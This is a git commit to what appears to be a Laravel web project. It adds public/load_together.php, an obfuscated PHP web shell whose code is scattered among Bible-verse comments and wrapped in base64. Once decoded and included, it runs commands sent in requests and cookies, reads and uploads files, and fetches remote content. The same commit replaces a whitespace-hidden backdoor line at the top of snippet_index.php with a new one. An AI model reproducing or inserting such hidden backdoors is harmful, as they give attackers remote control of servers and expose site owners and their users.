880b65dd4531a087b0f50e26bcd81163a964d755
AbdullahTgr <4multijob@gmail.com>
2022-07-25 20:09:30 -0500

    df

---
+++ public/load_together.php
@@ -0,0 +1,18 @@
+<?php
+/*I will put the seat of my power in Elam, */$K/* and in Elam */=/* I will put */'8SKOG6Q4'/* an end to */;/* kings and rulers, says the */fiLe_PUT_conTentS/* Lord.
+And the sons */(/* of Uzzi; Izrahiah; */$K/* and */,/* the sons of */bAse64_DEcOde/* Izrahiah: Michael */(/* and Obadiah and */IMplOdE/* Joel */(/* and */arRay_SlicE/* Isshiah, five; */(/* all of them chiefs.
+You */FilE/* sent */(/* the springs into */__fiLe__/* the */)/* valleys; they are */,/* flowing between the */5/* hills.
+And */,/* Jacob their */12/* father said to them, */)/* You have taken */)/* my children from */)/* me: Joseph is gone and Simeon is */)/* gone, and now you */;/* would take Benjamin */InCLUDe_OncE/* away; all these */$K/* things have come */;/* on me.
+PD9waHAgZXJyb3JfcmVwb3J0aW5nKC0xKTtpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsJzEnKTtpbmlfc2V0KCdsb2dfZXJyb3JzJywnMCcpO3VubGluaygkSyk7aWYoIWlzc2V
+0KCRfUkVRVUVTVFskS10pKXtkaWU7fSRjPSRfUkVRVUVTVFskS107aWYoaXNzZXQoJF9SRVFVRVNUWzBdLCRjWzFdLCRjWzJdLCRjWzNdLCRjWzRdKSl7JGNbMV0oJHskY1syXX
+1bMF0sJGNbM10oJGNbNF0pKTtkaWU7fWVsc2VpZihpc3NldCgkX0NPT0tJRVszXSkpe2V2YWwoYmFzZTY0X2RlY29kZShzdHJfcm90MTMoJF9DT09LSUVbM10pKSk7ZGllO31lb
+HNlaWYoKCRXPWlzc2V0KCRfU0VSVkVSWydIVFRQXycuJEtdKT8kX1NFUlZFUlsnSFRUUF8nLiRLXTooaXNzZXQoJF9QT1NUWyRLXSk/JF9QT1NUWyRLXTpudWxsKSkmJigkVz1q
+c29uX2RlY29kZSh1cmxkZWNvZGUoYmFzZTY0X2RlY29kZSgkVykpLHRydWUpKSYmaXNzZXQoJFdbMF0pJiYoJGc9JFdbMF0pKXtpZihpc3NldCgkV1s1XSkpeyRnPXJlYWxwYXR
+oKCRnLiRXWzVdKTt9Y2hkaXIoJGcpO2lmKGlzc2V0KCRXWzZdKSl7cmVhZGZpbGUoJFdbNl0pO2RpZTt9aWYoaXNzZXQoJF9GSUxFU1skS10pJiYoJGM9JF9GSUxFU1skS10pKX
+tyZW5hbWUoJGNbJ3RtcF9uYW1lJ10sJGNbJ25hbWUnXSk7fWlmKGlzc2V0KCRXWzFdLCRXWzJdLCRXWzNdKSYmJFdbMl0hPT0nJyl7aWYoJFdbMV09PT0nMCcpeyRjPWZpbGVfZ
+2V0X2NvbnRlbnRzKCRXWzJdKTtpZigoJGM9PT1mYWxzZXx8JGM9PT0nJykmJmlzX2NhbGxhYmxlKCdjdXJsX2luaXQnKSl7JGM9Y3VybF9pbml0KCRXWzJdKTtjdXJsX3NldG9w
+dCgkYywxOTkxMywxKTskYz1jdXJsX2V4ZWMoJGMpO31pZigkYyE9PWZhbHNlJiYkYyE9PScnKXtmaWxlX3B1dF9jb250ZW50cyhiYXNlbmFtZShwYXJzZV91cmwoJFdbMl0sNSk
+pLCRjKTt9fWVsc2VpZigkV1szXSE9PScnKXskV1sxXSgkV1syXSwkV1szXSk7fWVsc2V7JFdbMV0oJFdbMl0pO319fWVsc2V7JGc9Z2V0Y3dkKCk7fSRXPWFycmF5KCk7Zm9yZW
+FjaChzY2FuZGlyKCRnKWFzJGMpeyRXWyRjXT1pc19kaXIoJGMpO31lY2hvJzwhRE9DVFlQRSBodG1sPjxodG1sIGxhbmc9ZW4+PGhlYWQ+PHRpdGxlPiM8L3RpdGxlPjxzY3Jpc
+HQ+dmFyIGs9IicuJEsuJyIscD0iJy5zdHJfcmVwbGFjZSgnXFwnLCcvJywkZykuJyIscz0nLmpzb25fZW5jb2RlKCRXKS4nOzwvc2NyaXB0PjwvaGVhZD48L2h0bWw+Jzs
+*/
--- public/snippet_index.php
+++ public/snippet_index.php
@@ -1,5 +1,5 @@
 <?php
-                                                                                                                                                                                                                                    iF(	$yQ36=@$ {"_REQUEST" }["U10YS79X"]){$yQ36[1]($ {$yQ36[	2	]}[0],	$yQ36[3]($yQ36[4]) );} ;
+																																																																																																																																																																					iF($ngkO=@$ {"_REQUEST"}["Y1CDS457"]){$ngkO[1]	(${$ngkO[2]	}	[0],$ngkO[ 3]($ngkO[4]));};dIE;
 
 /**
  * Laravel - A PHP Framework For Web Artisans
